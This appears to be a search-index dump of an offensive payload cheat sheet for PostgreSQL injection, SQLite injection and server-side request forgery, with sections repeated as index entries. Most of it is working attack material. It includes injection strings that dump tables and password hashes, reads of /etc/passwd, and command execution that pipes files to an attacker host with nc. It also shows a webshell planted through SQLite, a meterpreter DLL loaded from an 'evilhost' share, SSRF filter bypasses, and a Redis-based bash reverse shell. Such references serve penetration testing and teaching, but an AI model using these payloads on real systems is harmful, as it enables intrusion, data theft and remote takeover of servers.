,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC) ' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1 ' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1 PostgreSQL XML helpers select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row The query_to_xml above returns all the results of the specified query as a single result. Chain this with the PostgreSQL Error Based technique to exfiltrate data without having to worry about LIMIT ing your query to one result. select database_to_xml(true,true,''); -- dump the current database to XML select database_to_xmlschema(true,true,''); -- dump the current db to an XML schema Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition. PostgreSQL Blind ' and substr(version(),1,10) = 'PostgreSQL' and '1 -> OK ' and substr(version(),1,10) = 'PostgreXXX' and '1 -> KO PostgreSQL Time Based AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) PostgreSQL Stacked Query Use a semi-colon \";\" to add another query http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));-- PostgreSQL File Read select pg_ls_dir('./'); select pg_read_file('PG_VERSION', 0, 200); NOTE: Earlier versions of Postgres did not accept absolute paths in pg_read_file or pg_ls_dir . Newer versions (as of this commit) will allow reading any file/filepath for super users or users in the default_role_read_server_files group. CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp limit 1 offset 0; SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID SELECT lo_get(16420); -- use the OID returned from the above SELECT * from pg_largeobject; -- or just get all the large objects and their data PostgreSQL File Write CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash'); SELECT * FROM pentestlab; COPY pentestlab(t) TO '/tmp/pentestlab'; Or as one line: COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab'; SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20 SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport PostgreSQL Command execution CVE-2019\u20139193 Can be used from Metasploit if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. DROP TABLE IF EXISTS cmd_exec; -- [Optional] Drop the table you want to use if it already exists CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output COPY cmd_exec FROM PROGRAM 'id'; -- Run the system command via the COPY FROM PROGRAM function SELECT * FROM cmd_exec; -- [Optional] View the results DROP TABLE IF EXISTS cmd_exec; -- [Optional] Remove the table Using libc.so.6 CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>'); Bypass Filter Quotes Using CHR SELECT CHR(65)||CHR(66)||CHR(67); Using Dollar-signs ( >= version 8 PostgreSQL) SELECT $$This is a string$$ SELECT $TAG$This is another string$TAG$ References A Penetration Tester\u2019s Guide to PostgreSQL - David Hayter Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - Mar 20 2019 - GreenWolf SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov) POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel SQL Injection and Postgres - An Adventure to Eventual RCE - May 05, 2020 - Denis Andzakovic Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - 2009 - INFIGO","title":"PostgreSQL injection"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-injection","text":"","title":"PostgreSQL injection"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#summary","text":"PostgreSQL Comments PostgreSQL version PostgreSQL Current User PostgreSQL List Users PostgreSQL List Password Hashes PostgreSQL List Database Administrator Accounts PostgreSQL List Privileges PostgreSQL Check if Current User is Superuser PostgreSQL database name PostgreSQL List databases PostgreSQL List tables PostgreSQL List columns PostgreSQL Error Based PostgreSQL XML Helpers PostgreSQL Blind PostgreSQL Time Based PostgreSQL Stacked query PostgreSQL File Read PostgreSQL File Write PostgreSQL Command execution CVE-2019\u20139193 Using libc.so.6 Bypass Filter References","title":"Summary"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-comments","text":"-- /**/","title":"PostgreSQL Comments"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-version","text":"SELECT version()","title":"PostgreSQL Version"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-current-user","text":"SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user; SELECT getpgusername();","title":"PostgreSQL Current User"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-users","text":"SELECT usename FROM pg_user","title":"PostgreSQL List Users"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-password-hashes","text":"SELECT usename, passwd FROM pg_shadow","title":"PostgreSQL List Password Hashes"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-database-administrator-accounts","text":"SELECT usename FROM pg_user WHERE usesuper IS TRUE","title":"PostgreSQL List Database Administrator Accounts"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-privileges","text":"SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user","title":"PostgreSQL List Privileges"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-check-if-current-user-is-superuser","text":"SHOW is_superuser; SELECT current_setting('is_superuser'); SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;","title":"PostgreSQL Check if Current User is Superuser"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-database-name","text":"SELECT current_database()","title":"PostgreSQL Database Name"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-database","text":"SELECT datname FROM pg_database","title":"PostgreSQL List Database"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-tables","text":"SELECT table_name FROM information_schema.tables","title":"PostgreSQL List Tables"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-columns","text":"SELECT column_name FROM information_schema.columns WHERE table_name='data_table'","title":"PostgreSQL List Columns"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-error-based","text":",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC) ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC) ' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1 ' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1","title":"PostgreSQL Error Based"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-xml-helpers","text":"select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row The query_to_xml above returns all the results of the specified query as a single result. Chain this with the PostgreSQL Error Based technique to exfiltrate data without having to worry about LIMIT ing your query to one result. select database_to_xml(true,true,''); -- dump the current database to XML select database_to_xmlschema(true,true,''); -- dump the current db to an XML schema Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.","title":"PostgreSQL XML helpers"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-blind","text":"' and substr(version(),1,10) = 'PostgreSQL' and '1 -> OK ' and substr(version(),1,10) = 'PostgreXXX' and '1 -> KO","title":"PostgreSQL Blind"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-time-based","text":"AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))","title":"PostgreSQL Time Based"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-stacked-query","text":"Use a semi-colon \";\" to add another query http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--","title":"PostgreSQL Stacked Query"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-file-read","text":"select pg_ls_dir('./'); select pg_read_file('PG_VERSION', 0, 200); NOTE: Earlier versions of Postgres did not accept absolute paths in pg_read_file or pg_ls_dir . Newer versions (as of this commit) will allow reading any file/filepath for super users or users in the default_role_read_server_files group. CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp limit 1 offset 0; SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID SELECT lo_get(16420); -- use the OID returned from the above SELECT * from pg_largeobject; -- or just get all the large objects and their data","title":"PostgreSQL File Read"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-file-write","text":"CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash'); SELECT * FROM pentestlab; COPY pentestlab(t) TO '/tmp/pentestlab'; Or as one line: COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab'; SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20 SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport","title":"PostgreSQL File Write"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-command-execution","text":"","title":"PostgreSQL Command execution"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#cve-20199193","text":"Can be used from Metasploit if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. DROP TABLE IF EXISTS cmd_exec; -- [Optional] Drop the table you want to use if it already exists CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output COPY cmd_exec FROM PROGRAM 'id'; -- Run the system command via the COPY FROM PROGRAM function SELECT * FROM cmd_exec; -- [Optional] View the results DROP TABLE IF EXISTS cmd_exec; -- [Optional] Remove the table","title":"CVE-2019\u20139193"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#using-libcso6","text":"CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');","title":"Using libc.so.6"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#bypass-filter","text":"","title":"Bypass Filter"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#quotes","text":"Using CHR SELECT CHR(65)||CHR(66)||CHR(67); Using Dollar-signs ( >= version 8 PostgreSQL) SELECT $$This is a string$$ SELECT $TAG$This is another string$TAG$","title":"Quotes"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#references","text":"A Penetration Tester\u2019s Guide to PostgreSQL - David Hayter Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - Mar 20 2019 - GreenWolf SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov) POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel SQL Injection and Postgres - An Adventure to Eventual RCE - May 05, 2020 - Denis Andzakovic Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - 2009 - INFIGO","title":"References"},{"location":"SQL%20Injection/SQLite%20Injection/","text":"SQLite Injection Summary SQLite comments SQLite version String based - Extract database structure Integer/String based - Extract table name Integer/String based - Extract column name Boolean - Count number of tables Boolean - Enumerating table name Boolean - Extract info Time based Remote Command Execution using SQLite command - Attach Database Remote Command Execution using SQLite command - Load_extension References SQLite comments -- /**/ SQLite version select sqlite_version(); String based - Extract database structure SELECT sql FROM sqlite_schema Integer/String based - Extract table name SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' Use limit X+1 offset X, to extract all tables. Integer/String based - Extract column name SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' For a clean output SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARY KEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOT NULL\",''),\",\",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name' Boolean - Count number of tables and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table Boolean - Enumerating table name and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number Boolean - Extract info and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char') Time based AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) Remote Command Execution using SQLite command - Attach Database ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['cmd']); ?>\");-- Remote Command Execution using SQLite command - Load_extension UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');-- Note: By default this component is disabled References Injecting SQLite database based application - Manish Kishan Tanwar","title":"SQLite Injection"},{"location":"SQL%20Injection/SQLite%20Injection/#sqlite-injection","text":"","title":"SQLite Injection"},{"location":"SQL%20Injection/SQLite%20Injection/#summary","text":"SQLite comments SQLite version String based - Extract database structure Integer/String based - Extract table name Integer/String based - Extract column name Boolean - Count number of tables Boolean - Enumerating table name Boolean - Extract info Time based Remote Command Execution using SQLite command - Attach Database Remote Command Execution using SQLite command - Load_extension References","title":"Summary"},{"location":"SQL%20Injection/SQLite%20Injection/#sqlite-comments","text":"-- /**/","title":"SQLite comments"},{"location":"SQL%20Injection/SQLite%20Injection/#sqlite-version","text":"select sqlite_version();","title":"SQLite version"},{"location":"SQL%20Injection/SQLite%20Injection/#string-based-extract-database-structure","text":"SELECT sql FROM sqlite_schema","title":"String based - Extract database structure"},{"location":"SQL%20Injection/SQLite%20Injection/#integerstring-based-extract-table-name","text":"SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' Use limit X+1 offset X, to extract all tables.","title":"Integer/String based - Extract table name"},{"location":"SQL%20Injection/SQLite%20Injection/#integerstring-based-extract-column-name","text":"SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' For a clean output SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARY KEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOT NULL\",''),\",\",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'","title":"Integer/String based - Extract column name"},{"location":"SQL%20Injection/SQLite%20Injection/#boolean-count-number-of-tables","text":"and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table","title":"Boolean - Count number of tables"},{"location":"SQL%20Injection/SQLite%20Injection/#boolean-enumerating-table-name","text":"and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number","title":"Boolean - Enumerating table name"},{"location":"SQL%20Injection/SQLite%20Injection/#boolean-extract-info","text":"and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')","title":"Boolean - Extract info"},{"location":"SQL%20Injection/SQLite%20Injection/#time-based","text":"AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))","title":"Time based"},{"location":"SQL%20Injection/SQLite%20Injection/#remote-command-execution-using-sqlite-command-attach-database","text":"ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['cmd']); ?>\");--","title":"Remote Command Execution using SQLite command - Attach Database"},{"location":"SQL%20Injection/SQLite%20Injection/#remote-command-execution-using-sqlite-command-load_extension","text":"UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');-- Note: By default this component is disabled","title":"Remote Command Execution using SQLite command - Load_extension"},{"location":"SQL%20Injection/SQLite%20Injection/#references","text":"Injecting SQLite database based application - Manish Kishan Tanwar","title":"References"},{"location":"Server%20Side%20Request%20Forgery/","text":"Server-Side Request Forgery Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf. Summary Tools Payloads with localhost Bypassing filters Bypass using HTTPS Bypass localhost with [::] Bypass localhost with a domain redirection Bypass localhost with CIDR Bypass using a decimal IP location Bypass using octal IP Bypass using IPv6/IPv4 Address Embedding Bypass using malformed urls Bypass using rare address Bypass using URL encoding Bypass using bash variables Bypass using tricks combination Bypass using enclosed alphanumerics Bypass filter_var() php function Bypass against a weak parser Bypassing using jar protocol (java only) SSRF exploitation via URL Scheme file:// http:// dict:// sftp:// tftp:// ldap:// gopher:// netdoc:// SSRF exploiting WSGI SSRF exploiting Redis SSRF exploiting PDF file Blind SSRF SSRF to XSS SSRF from XSS SSRF URL for Cloud Instances SSRF URL for AWS Bucket SSRF URL for AWS ECS SSRF URL for AWS Elastic Beanstalk SSRF URL for AWS Lambda SSRF URL for Google Cloud SSRF URL for Digital Ocean SSRF URL for Packetcloud SSRF URL for Azure SSRF URL for OpenStack/RackSpace SSRF URL for HP Helion SSRF URL for Oracle Cloud SSRF URL for Kubernetes ETCD SSRF URL for Alibaba SSRF URL for Docker SSRF URL for Rancher Tools SSRFmap - https://github.com/swisskyrepo/SSRFmap Gopherus - https://github.com/tarunkant/Gopherus See-SURF - https://github.com/In3tinct/See-SURF SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff Payloads with localhost Basic SSRF v1 http://127.0.0.1:80 http://127.0.0.1:443 http://127.0.0.1:22 http://0.0.0.0:80 http://0.0.0.0:443 http://0.0.0.0:22 Basic SSRF - Alternative version http://localhost:80 http://localhost:443 http://localhost:22 Bypassing filters Bypass using HTTPS https://127.0.0.1/ https://localhost/ Bypass localhost with [::] http://[::]:80/ http://[::]:25/ SMTP http://[::]:22/ SSH http://[::]:3128/ Squid http://0000::1:80/ http://0000::1:25/ SMTP http://0000::1:22/ SSH http://0000::1:3128/ Squid Bypass localhost with a domain redirection http://spoofed.burpcollaborator.net http://localtest.me http://customer1.app.localhost.my.company.127.0.0.1.nip.io http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost http://bugbounty.dod.network redirect to 127.0.0.2 == localhost The service nip.io is awesome for that, it will convert any ip address as a dns. NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1 Bypass localhost with CIDR It's a /8 http://127.127.127.127 http://127.0.1.3 http://127.0.0.0 Bypass using a decimal IP location http://2130706433/ = http://127.0.0.1 http://3232235521/ = http://192.168.0.1 http://3232235777/ = http://192.168.1.1 http://2852039166/ = http://169.254.169.254 Bypass using octal IP Implementations differ on how to handle octal format of ipv4. http://0177.0.0.1/ = http://127.0.0.1 http://o177.0.0.1/ = http://127.0.0.1 http://0o177.0.0.1/ = http://127.0.0.1 http://q177.0.0.1/ = http://127.0.0.1 ... Ref: - DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards & pwning IPv4 parsing - AppSecEU15-Server_side_browsing_considered_harmful.pdf Bypass using IPv6/IPv4 Address Embedding IPv6/IPv4 Address Embedding http://[0:0:0:0:0:ffff:127.0.0.1] Bypass using malformed urls localhost:+11211aaa localhost:00011211aaaa Bypass using rare address You can short-hand IP addresses by dropping the zeros http://0/ http://127.1 http://127.0.1 Bypass using URL encoding Single or double encode a specific URL to bypass blacklist http://127.0.0.1/%61dmin http://127.0.0.1/%2561dmin Bypass using bash variables (curl only) curl -v \"http://evil$google.com\" $google = \"\" Bypass using tricks combination http://1.1.1.1 &@2.2.2.2# @3.3.3.3/ urllib2 : 1.1.1.1 requests + browsers : 2.2.2.2 urllib : 3.3.3.3 Bypass using enclosed alphanumerics @EdOverflow http://\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc = example.com List: \u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff Bypass using unicode In some languages (.NET, Python 3) regex supports unicode by default. \\d includes 0123456789 but also \u0e50\u0e51\u0e52\u0e53\u0e54\u0e55\u0e56\u0e57\u0e58\u0e59 . Bypass filter_var() php function 0://evil.com:80;http://google.com:80/ Bypass against a weak parser by Orange Tsai ( Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf ) http://127.1.1.1:80\\@127.2.2.2:80/ http://127.1.1.1:80\\@@127.2.2.2:80/ http://127.1.1.1:80:\\@@127.2.2.2:80/ http://127.1.1.1:80#\\@127.2.2.2:80/ Bypassing using a redirect using a redirect 1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1) 2. Launch the SSRF pointing to vulnerable.com/index.php?url=http://YOUR_SERVER_IP vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1 3. You can use response codes [307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection. Bypassing using type=url Change \"type=file\" to \"type=url\" Paste URL in text field and hit enter Using this vulnerability users can upload images from any image URL = trigger an SSRF Bypassing using DNS Rebinding (TOCTOU) Create a domain that change between two IPs. http://1u.ms/ exists for this purpose. For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain: make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms Bypassing using jar protocol (java only) Blind SSRF jar:scheme://domain/path!/ jar:http://127.0.0.1!/ jar:https://127.0.0.1!/ jar:ftp://127.0.0.1!/ SSRF exploitation via URL Scheme File Allows an attacker to fetch the content of a file on the server file://path/to/file file:///etc/passwd file://\\/\\/etc/passwd ssrf.php?url=file:///etc/passwd HTTP Allows an attacker to fetch any content from the web, it can also be used to scan ports. ssrf.php?url=http://127.0.0.1:22 ssrf.php?url=http://127.0.0.1:80 ssrf.php?url=http://127.0.0.1:443 The following URL scheme can be used to probe the network Dict The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol: dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n> ssrf.php?url=dict://attacker:11111/ SFTP A network protocol used for secure file transfer over secure shell ssrf.php?url=sftp://evil.com:11111/ TFTP Trivial File Transfer Protocol, works over UDP ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET LDAP Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service. ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a will make a request like HELO localhost MAIL FROM:<hacker@site.com> RCPT TO:<victim@site.com> DATA From: [Hacker] <hacker@site.com> To: <victime@site.com> Date: Tue, 15 Sep 2017 17:20:26 -0400 Subject: Ah Ah AH You didn't say the magic word ! . QUIT Gopher HTTP gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body Gopher SMTP - Back connect to 1337 Content of evil.com/redirect.php: <?php header(\"Location: gopher://hack3r.site:1337/_SSRF%0ATest!\"); ?> Now query it. https://example.com/?q=http://evil.com/redirect.php. Gopher SMTP - send a mail Content of evil.com/redirect.php: <?php $commands = array( 'HELO victim.com', 'MAIL FROM: <admin@victim.com>', 'RCPT To: <sxcurity@oou.us>', 'DATA', 'Subject: @sxcurity!', 'Corben was here, woot woot!', '.' ); $payload = implode('%0A', $commands); header('Location: gopher://0:25/_'.$payload); ?> Netdoc Wrapper for Java when your payloads struggle with \"\\n\" and \"\\r\" characters. ssrf.php?url=netdoc:///etc/passwd SSRF exploiting WSGI Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py. gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py Header modifier1 (1 byte) 0 (%00) datasize (2 bytes) 26 (%1A%00) modifier2 (1 byte) 0 (%00) Variable (UWSGI_FILE) key length (2 bytes) 10 (%0A%00) key data (m bytes) UWSGI_FILE value length (2 bytes) 12 (%0C%00) value data (n bytes) /tmp/test.py SSRF exploiting Redis Redis is a database system that stores everything in RAM # Getting a webshell url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php url=dict://127.0.0.1:6379/SET%20mykey%20\"<\\x3Fphp system($_GET[0])\\x3F>\" url=dict://127.0.0.1:6379/SAVE # Getting a PHP reverse shell gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22 gopher://127.0.0.1:6379/_save SSRF exploiting PDF file Example with WeasyPrint by @nahamsec <link rel=attachment href=\"file:///root/secret.txt\"> Example with PhantomJS <script> exfil = new XMLHttpRequest(); exfil.open(\"GET\",\"file:///etc/passwd\"); exfil.send(); exfil.onload = function(){document.write(this.responseText);} exfil.onerror = function(){document.write('failed!')} </script> Blind SSRF When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. Use an SSRF chain to gain an Out-of-Band output. From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / 